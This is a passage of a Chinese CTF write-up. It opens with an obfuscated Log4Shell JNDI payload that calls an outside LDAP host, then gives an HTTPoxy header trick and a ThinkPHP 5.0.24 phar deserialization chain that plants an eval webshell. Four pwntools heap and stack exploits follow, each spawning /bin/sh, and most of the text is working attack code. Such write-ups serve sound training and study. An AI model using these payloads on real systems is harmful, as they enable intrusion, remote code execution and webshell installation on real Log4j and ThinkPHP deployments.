${j${iqV:xQtVwM:-n}d${WnFLI:-i}${j:YxXkbc:QpCi:k:QA:-:}${tuNJ:pa:vDTPc:-l}dap:${mxyDc:-/}/${X:A:wJfVUX:-1}${u:si:TmOs:-9}2${x:DGbnfN:-.}${h:Ga:H:Gmiv:zYQf:-1}6${dqV:KYvLFD:Edfgq:HzKoK:-8}${KNzKwB:IEJiU:-.}${QMgb:NTVFr:gM:-2}.2${VPb:kgVqX:vMNFgF:EV:iyt:-3}8:1${nOhh:uTaV:TlMnJ:J:FM:-3}${zUKT:mVGhb:RHbf:ypvu:-8}${y:bPcT:g:Ya:-9}${EDXJQ:Eetclr:oSVeHz:J:-/}To${GbLFYe:UpYi:-m}cat${UaV:Mo:Fu:UDboa:ePDD:-B}${uzqh:O:lxU:UFRpQk:gGbqT:-y}p${l:pJeje:P:s:vjiPI:-a}${LCJ:vM:Ebt:LJmS:-s}${pXuvuL:oWk:kXTgAe:kml:-s}${WbhDYc:u:Ne:Slcje:-/}${M:-T}omc${kBm:V:iVQ:-a}${cYCt:-t}${iGHgwi:I:-E}cho}
```

### 【Flag配送中心】

HTTPoxy漏洞（CVE-2016-5385）

VPS上监听对应端口后，在HTTP请求包中添加Proxy头：

```
Proxy: http://VPS:POST/
```

即可监听到Flag

### 【tp】

`thinkphp5.0.24` 反序列化

通过网上`poc` 生成`phar` 文件后，上传

然后变量覆盖，传入：`?FILES\[file\]\[name\]=phar://【上传的phar 文件名】`

触发`phar` 反序列化，生成`webshell`

**生成phar 的poc**

```
<?php
namespace think\process\pipes {
    class Windows {
        private $files = [];

        public function __construct($files)
        {
            $this->files = [$files]; 
        }
    }
}

namespace think {
    abstract class Model{
        protected $append = [];
        protected $error = null;
        public $parent;

        function __construct($output, $modelRelation)
        {
            $this->parent = $output; 
            $this->append = array("xxx"=>"getError");    
            $this->error = $modelRelation;   
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{
        function __construct($output, $modelRelation)
        {
            parent::__construct($output, $modelRelation);
        }
    }
}

namespace think\model\relation{
    class HasOne extends OneToOne {

    }
}
namespace think\model\relation {
    abstract class OneToOne
    {
        protected $selfRelation;
        protected $bindAttr = [];
        protected $query;
        function __construct($query)
        {
            $this->selfRelation = 0;
            $this->query = $query;    //$query指向Query
            $this->bindAttr = ['xxx'];// $value值，作为call函数引用的第二变量
        }
    }
}

namespace think\db {
    class Query {
        protected $model;

        function __construct($model)
        {
            $this->model = $model; //$this->model=> think\console\Output;
        }
    }
}
namespace think\console{
    class Output{
        private $handle;
        protected $styles;
        function __construct($handle)
        {
            $this->styles = ['getAttr'];
            $this->handle =$handle; //$handle->think\session\driver\Memcached
        }

    }
}
namespace think\session\driver {
    class Memcached
    {
        protected $handler;

        function __construct($handle)
        {
            $this->handler = $handle; //$handle->think\cache\driver\File
        }
    }
}

namespace think\cache\driver {
    class File
    {
        protected $options=null;
        protected $tag;

        function __construct(){
            $this->options=[
                'expire' => 3600,
                'cache_subdir' => false,
                'prefix' => '',
                'path'  => 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../../var/www/html/',
                'data_compress' => false,
            ];
            $this->tag = 'xxx';
        }

    }
}

namespace {
    $Memcached = new think\session\driver\Memcached(new \think\cache\driver\File());
    $Output = new think\console\Output($Memcached);
    $model = new think\db\Query($Output);
    $HasOne = new think\model\relation\HasOne($model);
    $window = new think\process\pipes\Windows(new think\model\Pivot($Output,$HasOne));

    $phar = new Phar("phar.phar"); 
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($window);        
    $phar->addFromString("test.txt", "test");        
    $phar->stopBuffering();
}
```
# Pwn

### 【pwn1】

pwn签到题，唯一有点坑就是在出函数时并不仅仅是leave；ret，而是多出了两行汇编代码。因此需要我们分析和调试一下。![图片](https://img-blog.csdnimg.cn/img_convert/cf6510bae78f50b6ac5c90f25444c0a7.webp?x-oss-process=image/format,png)

exp

```
from pwn import *
io=process('pwn1')
io.recvuntil(":")
stack = int(io.recv(10),16)
gdb.attach(io)
io.sendline('a'*0x30+p32(0x8048540)+p32(stack+0x34))
io.interactive()
```

### 【pwn2】

libc-2.27的off-by-one，细心一点就能发现for循环这块会让我们多输入一个字节。

![图片](https://img-blog.csdnimg.cn/img_convert/75e187221d88fa32723525ed32f18090.webp?x-oss-process=image/format,png)

exp

```
from pwn import *
io=process('./pwn2')
elf=ELF('./pwn2')
libc=elf.libc
#libc=ELF('./libc-2.27.so')
context.log_level='debug'

def add(size,content):
 io.sendlineafter('Choice: ','1')
 io.sendlineafter('size: ',str(size))
 io.sendafter('content: ',content)

def edit(index,content):
 io.sendlineafter('Choice: ','2')
 io.sendlineafter('idx: ',str(index))
 io.sendlineafter('content: ',content)

def dele(index):
 io.sendlineafter('Choice: ','3')
 io.sendlineafter('idx: ',str(index))

def show(index):
 io.sendlineafter('Choice: ','4')
 io.sendlineafter('idx: ',str(index))

def exp():
 add(0xf8,'f1ag\n')#0
 add(0xf8,'f1ag\n')#1
 add(0xf8,'f1ag\n')#2
 add(0xf8,'f1ag\n')#3
 add(0x18,'f1ag\n')#4
 dele(2)
 add(0xf8,'a'*0xf0+p64(0x300)+'\n')#2

 for i in range(7):
  add(0xf8,'a\n')#5~11
 for i in range(7):
  dele(11-i)
 
 dele(0)
 gdb.attach(io)
 dele(3)
 for i in range(7):
  add(0xf8,'f1ag\n')#0,3,5~9
 add(0xf8,'f1ag\n')#10
 show(1)
 malloc_hook = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96-16
 libc_base = malloc_hook - libc.symbols['__malloc_hook']
 print('libc_base',hex(libc_base))
 free_hook = libc.symbols['__free_hook'] + libc_base
 system = libc.symbols['system'] + libc_base

 add(0xf8,'f1ag\n')#11=1
 dele(1)
 edit(11,p64(free_hook-8)+'\n')
 add(0xf8,'f1ag\n')#1
 add(0xf8,'/bin/sh\x00'+p64(system)+'\n')#12
 dele(12)
 io.interactive()
exp()
```

### 【pwn3】

这个题利用的是strcpy、strcat等一些对字符串操作的函数的漏洞，当他们复制字符串的时候会把字符串的最后一个字节\x00给带上，极容易造成off-by-null漏洞。而这个题的漏洞点正在于此，\x00正好将存放长度的地址覆盖置0，就可以将长度的值改写为一个很大的值，打败boss进入到奖励函数中。![图片](https://img-blog.csdnimg.cn/img_convert/3a7ba0bb6709a77fb33cb50426c820ec.webp?x-oss-process=image/format,png)

因为有exit函数，很容易联想到打exit_hook。[exit_hook的知识点]( PWN学习—exit_hook-偷家 - BlackBird's Blog (blackbird-bb.github.io) ) 参考这位西电大佬写的博客，然后直接打onegadget就ok了。在打one_gadget的时候正常出来的四个gadget不能打通，这时候在one_gadget后加上-l2可以找到更多的gadget。

exp

```
from pwn import *
#io=process('./Gpwn3')
io=remote('127.0.0.1',10002)
elf=ELF('./Gpwn3')
libc=ELF('./libc-2.23.so')
context.log_level='debug'

def create(description):
 io.sendlineafter('choice:','1')
 io.sendafter(' level :\n',description)

def power(description):
 io.sendlineafter('choice:','2')
 io.sendafter('another level :',description) 

def beat(): 
 io.sendlineafter('choice:','3')

def give_up():
 io.sendlineafter('choice:','4')
   
def exp():
 create('a'*35+'\n')
 power('a')
 power('\xff\xff\xff\xff')
 beat()
 
 io.recvuntil('reward: ')
 puts=int(io.recv(14),16)
 libc_base=puts-libc.symbols['puts'] 
 print('libc_base',hex(libc_base))
 system=libc_base+libc.symbols['system']
 binsh=libc_base+libc.search('/bin/sh').next()
 dl_rtld_unlock_recursive = libc_base+0x5f0040+3856
 gadget=[0x45226,0x4527a,0xf03a4,0xf1247,0xcd173,0xcd248,0xf03b0,0xf67f0]
 #gdb.attach(io)
 io.sendafter('your name:',p64(dl_rtld_unlock_recursive))
 
 io.sendafter('for you!',p64(gadget[7]+libc_base))
 io.interactive()
exp()
```

### 【pwn4】

这个题有个小问题，忘了在add函数后加break跳出switch，因此有师傅修switch时修不出来add，只能看汇编代码，在这里和各位师傅道个歉。

此题的漏洞在free时没有对指针置0，libc-2.31的uaf。![图片](https://img-blog.csdnimg.cn/img_convert/501648abb30189f7c023ce63ab1c964e.webp?x-oss-process=image/format,png)

exp

```
from pwn import *
io=process('./pwn4')
elf=ELF('./pwn4')
libc=elf('./libc-2.31.so')
context.log_level='debug'

def add(index,name,key,value):
 io.sendlineafter('Your choice: ','1')
 io.sendlineafter('Your index: ',str(index))
 io.sendlineafter('Enter your name: ',name)
 io.sendlineafter('Please input a key: ',key)
 io.sendlineafter('Please input a value: ',str(value))
 
def show(index):
 io.sendlineafter('Your choice: ','2')
 io.sendlineafter('Your index: ',str(index))

def edit(index,name,length,key,value):
 io.sendlineafter('Your choice: ','3')
 io.sendlineafter('Your index: ',str(index))
 io.sendlineafter('Enter your name: ',name)
 io.sendlineafter('New key length: ',str(length))
 io.sendlineafter('Key: ',key)
 io.sendlineafter('Value: ',str(value))
 
def dele(index):
 io.sendlineafter('Your choice: ','4')
 io.sendlineafter('Your index: ',str(index))
 
def exp():
 add(0,'f1ag','a'*0x417,0)
 add(1,'f1ag','a'*0x3c7,1)
 dele(0)
 show(0)
 malloc_hook = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 96 -16
 libc_base = malloc_hook - libc.symbols['__malloc_hook']
 print('libc_base',hex(libc_base))
 free_hook = libc.symbols['__free_hook'] + libc_base
 system = libc.symbols['system'] + libc_base
 
 add(2,'f1ag','a'*0x57,2)
 add(3,'f1ag','a'*0x57,3)
 dele(3)
 dele(2)
 #gdb.attach(io)
 edit(1,'f1ag',8,'/bin/sh\x00',1)
 edit(2,'f1ag',6,p32((free_hook-0x51)&0xffffffff)+p16(((free_hook)>>32)&0xffff),2)
 
 add(4,'f1ag','a'*0x51+p32((system)&0xffffffff)+p16(((system)>>32)&0xffff),'4')
 
 #add(6,'f1ag',p64(system),5)
 
 dele(1)
 io.interactive()
exp()
```

